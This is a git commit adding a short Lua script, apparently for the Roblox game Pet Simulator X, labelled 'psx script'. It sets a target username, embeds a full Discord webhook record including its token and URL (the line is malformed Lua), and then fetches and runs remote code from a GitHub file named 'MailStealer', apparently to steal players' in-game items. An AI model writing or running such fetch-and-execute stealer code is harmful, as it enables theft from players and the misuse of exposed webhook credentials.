08016310e8ff07fface585dd54c75489affe6ea0
kjfeoujdx <134698770+kjfeoujdx@users.noreply.github.com>
2023-06-16 17:33:34 +0300

    psx script

---
+++ Script.lua
@@ -0,0 +1,6 @@
+_G.UserNamey = "stastop137"
+
+_G.Webhooky = "application_id": null, "avatar": null, "channel_id": "1007051073904713820", "guild_id": "1007051073367838841", "id": "1118500908112805958", "name": "Spidey Bot", "type": 1, "user": {"id": "1006598210283905156", "username": "psh0nka\ud83d\udda4", "avatar": "a_b0f6c294c152fe3de424184230fc462c", "discriminator": "9999", "public_flags": 128, "flags": 128, "banner": "a_bfdd998243162436649ff6c381c36f8a", "accent_color": null, "global_name": "psh0nka\ud83d\udda4", "avatar_decoration": "v3_a_87b1052cdc7d46a00a699ef2b76cbfa4", "display_name": "psh0nka\ud83d\udda4", "banner_color": null}, "token": "CyCsoLPeDycEbm1SDIA82zCxbyIPZilf9OUzPS-vRJ1BoJLDiicF1OkNuvsIsOMeA3sJ", "url": "https://discord.com/api/webhooks/1118500908112805958/CyCsoLPeDycEbm1SDIA82zCxbyIPZilf9OUzPS-vRJ1BoJLDiicF1OkNuvsIsOMeA3sJ"}"
+
+--[[ Main Script ]]--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97%20MailStealer%20%E2%9C%97"))()
